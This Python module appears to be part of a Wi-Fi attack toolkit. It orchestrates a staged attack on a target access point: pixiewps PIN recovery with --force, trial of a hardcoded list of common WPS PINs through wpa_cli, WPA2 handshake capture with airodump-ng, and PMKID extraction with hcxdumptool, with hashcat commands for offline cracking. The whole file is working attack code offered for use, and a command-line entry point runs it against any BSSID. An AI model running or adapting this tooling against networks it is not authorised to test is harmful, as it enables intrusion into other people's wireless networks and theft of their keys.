#!/usr/bin/env python3
"""
pixiewps_bridge.py

Integration bridge providing an enhanced WPS attack handler that uses
pixiewps (when available) and several fallbacks (common PINs, handshake
capture, PMKID extraction). Designed to be imported by FARHAN-Shot or run
from a lightweight wrapper script.

This file was added to integrate features from pixiewps-extend into the
advance-pixiewps repository in a minimal, self-contained way.
"""

from pathlib import Path
import subprocess
import re
import time
import os
import tempfile
import json
from datetime import datetime


class WPSAttackHandler:
    """Handles WPS attacks with comprehensive fallback mechanisms."""

    # Common WPS PINs for quick fallback
    COMMON_PINS = [
        "12345670", "00000000", "11111111", "12341234",
        "88888888", "19283746", "99999999", "11223344"
    ]

    def __init__(self, interface: str = "wlan0mon", verbose: bool = True):
        self.interface = interface
        self.verbose = verbose
        self.results = {}

    def _log(self, level: str, msg: str) -> None:
        if self.verbose or level in ("SUCCESS", "ERROR"):
            timestamp = datetime.now().strftime("%H:%M:%S")
            symbols = {
                "INFO": "[i]",
                "SUCCESS": "[+]",
                "ERROR": "[-]",
                "WARN": "[!]",
                "DEBUG": "[*]"
            }
            print(f"{symbols.get(level,'[*]')} [{timestamp}] {msg}")

    def run_pixiewps_with_force(self, pke: str, pkr: str, e_hash1: str,
                                e_hash2: str, authkey: str, e_nonce: str,
                                timeout: int = 30):
        """Run pixiewps with --force to try aggressive extraction."""
        self._log("INFO", "Attempting pixiewps with --force flag...")

        cmd = [
            "pixiewps",
            "--pke", pke,
            "--pkr", pkr,
            "--e-hash1", e_hash1,
            "--e-hash2", e_hash2,
            "--authkey", authkey,
            "--e-nonce", e_nonce,
            "--force",
            "-Z",
        ]

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            output = (proc.stdout or "") + (proc.stderr or "")
            # Look for common output patterns that include an 8-digit PIN.
            m = re.search(r"([0-9]{8})", output)
            if m:
                pin = m.group(1)
                self._log("SUCCESS", f"PIN found with pixiewps: {pin}")
                return {"pin": pin, "method": "pixiewps_force", "output": output}
            self._log("DEBUG", f"pixiewps output (truncated):\n{output[:1000]}")
            return None
        except subprocess.TimeoutExpired:
            self._log("WARN", "pixiewps timed out")
            return None
        except FileNotFoundError:
            self._log("WARN", "pixiewps not found on PATH")
            return None
        except Exception as e:
            self._log("ERROR", f"pixiewps execution failed: {e}")
            return None

    def try_wps_pin(self, bssid: str, pin: str, interface: str = None, timeout: int = 12) -> bool:
        """Attempt a WPS registration using wpa_cli. Returns True on success."""
        iface = interface or self.interface
        self._log("INFO", f"Trying WPS PIN {pin} against {bssid} on {iface}")
        try:
            # Use wpa_cli wps_reg <bssid> <pin>
            cmd = ["wpa_cli", "-i", iface, "wps_reg", bssid, pin]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            out = (proc.stdout or "") + (proc.stderr or "")
            # wpa_cli output varies; check for OK / FAIL / SUCCESS markers
            if proc.returncode == 0 and ("OK" in out or "SUCCESS" in out.upper()):
                return True
            # Some builds print 'WPS success' or include 'Network Key'
            if "WPS success" in out or "Network Key" in out:
                return True
            return False
        except FileNotFoundError:
            self._log("WARN", "wpa_cli not found on PATH; cannot test PINs via wpa_cli")
            return False
        except Exception as e:
            self._log("DEBUG", f"try_wps_pin exception: {e}")
            return False

    def test_common_pins(self, bssid: str, essid: str = None, interface: str = None):
        """Test a short list of well-known pins as a quick fallback."""
        self._log("INFO", "Testing common WPS PINs...")
        for idx, pin in enumerate(self.COMMON_PINS, start=1):
            self._log("INFO", f"[{idx}/{len(self.COMMON_PINS)}] Testing PIN: {pin}")
            if self.try_wps_pin(bssid, pin, interface=interface):
                self._log("SUCCESS", f"PIN accepted: {pin}")
                return {"pin": pin, "method": "common_pin_bruteforce"}
            time.sleep(0.8)
        self._log("WARN", "No common PINs worked")
        return None

    def capture_handshake(self, bssid: str, essid: str, channel: int,
                          timeout: int = 25) -> dict | None:
        """Launch airodump-ng to capture a WPA2 handshake for offline cracking.

        Returns dict with handshake file path on success, else None.
        """
        self._log("INFO", f"Capturing WPA2 handshake for {essid} ({bssid}) on channel {channel} for {timeout}s")
        tmpdir = tempfile.gettempdir()
        base = os.path.join(tmpdir, f"{essid.replace(' ','_')}_{bssid.replace(':','')}")
        pcap_prefix = base
        try:
            # airodump-ng -c <channel> --bssid <bssid> -w <prefix> <iface>
            cmd = [
                "airodump-ng",
                "-c", str(channel),
                "--bssid", bssid,
                "-w", pcap_prefix,
                self.interface
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._log("DEBUG", f"airodump-ng pid={proc.pid}")
            time.sleep(timeout)
            proc.terminate()
            # airodump-ng writes files like <prefix>-01.cap
            capfile = f"{pcap_prefix}-01.cap"
            if os.path.exists(capfile):
                self._log("SUCCESS", f"Handshake captured: {capfile}")
                return {"handshake": capfile, "method": "wpa2_handshake", "note": f"hashcat -m 22000 {capfile} wordlist.txt"}
            else:
                self._log("WARN", "No handshake captured (airodump-ng output file not found)")
                return None
        except FileNotFoundError:
            self._log("WARN", "airodump-ng not found on PATH")
            return None
        except Exception as e:
            self._log("ERROR", f"Handshake capture error: {e}")
            return None

    def extract_pmkid(self, bssid: str, essid: str, timeout: int = 15) -> dict | None:
        """Run hcxdumptool (if installed) to obtain PMKID for offline cracking."""
        self._log("INFO", "Attempting PMKID extraction with hcxdumptool...")
        tmpdir = tempfile.gettempdir()
        pmkid_file = os.path.join(tmpdir, f"pmkid_{bssid.replace(':','')}.pcapng")
        try:
            cmd = [
                "hcxdumptool",
                "-o", pmkid_file,
                "-i", self.interface,
                "--enable_status=3",
                "--filterlist_ap=", bssid
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(timeout)
            proc.terminate()
            if os.path.exists(pmkid_file) and os.path.getsize(pmkid_file) > 100:
                self._log("SUCCESS", f"PMKID file: {pmkid_file}")
                return {"pmkid": pmkid_file, "method": "pmkid_offline", "note": f"hashcat -m 16800 {pmkid_file} wordlist.txt"}
            else:
                self._log("WARN", "No PMKID captured (hcxdumptool output missing or too small)")
                return None
        except FileNotFoundError:
            self._log("WARN", "hcxdumptool not found on PATH")
            return None
        except Exception as e:
            self._log("ERROR", f"PMKID extraction error: {e}")
            return None

    def comprehensive_attack(self, bssid: str, essid: str,
                             pke: str = None, pkr: str = None,
                             e_hash1: str = None, e_hash2: str = None,
                             authkey: str = None, e_nonce: str = None,
                             channel: int = 6) -> dict:
        """Orchestrate a staged attack with pixiewps -> common pins -> capture -> pmkid."""
        self._log("INFO", "Starting comprehensive WPS attack")
        result = {
            "bssid": bssid,
            "essid": essid,
            "success": False,
            "pin": None,
            "method": None,
            "handshake": None,
            "pmkid": None,
            "alternatives": []
        }

        # Stage 1: pixiewps forced (if we have the fields)
        if pke and pkr and e_hash1 and e_hash2 and authkey and e_nonce:
            self._log("INFO", "Stage 1: pixiewps (forced)")
            pix = self.run_pixiewps_with_force(pke, pkr, e_hash1, e_hash2, authkey, e_nonce)
            if pix and pix.get("pin"):
                result.update({"success": True, "pin": pix["pin"], "method": pix.get("method")})
                return result

        # Stage 2: test common pins
        self._log("INFO", "Stage 2: common PIN list")
        cp = self.test_common_pins(bssid, essid, interface=self.interface)
        if cp and cp.get("pin"):
            result.update({"success": True, "pin": cp["pin"], "method": cp.get("method")})
            return result

        # Stage 3: handshake capture
        self._log("INFO", "Stage 3: capture handshake for offline cracking")
        hs = self.capture_handshake(bssid, essid, channel, timeout=25)
        if hs:
            result["handshake"] = hs.get("handshake")
            result["alternatives"].append(hs)

        # Stage 4: pmkid extraction
        self._log("INFO", "Stage 4: pmkid extraction")
        pk = self.extract_pmkid(bssid, essid, timeout=15)
        if pk:
            result["pmkid"] = pk.get("pmkid")
            result["alternatives"].append(pk)

        if result["success"]:
            self._log("SUCCESS", "PIN obtained")
        else:
            if result["alternatives"]:
                self._log("WARN", f"PIN not found; alternatives available: {len(result['alternatives'])}")
            else:
                self._log("ERROR", "All stages failed")

        return result


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="WPS attack helper (pixiewps bridge)")
    parser.add_argument("bssid")
    parser.add_argument("--essid", default="Target")
    parser.add_argument("--iface", default="wlan0mon")
    parser.add_argument("--channel", type=int, default=6)
    args = parser.parse_args()

    attacker = WPSAttackHandler(interface=args.iface, verbose=True)
    out = attacker.comprehensive_attack(bssid=args.bssid, essid=args.essid, channel=args.channel)
    print(json.dumps(out, indent=2))
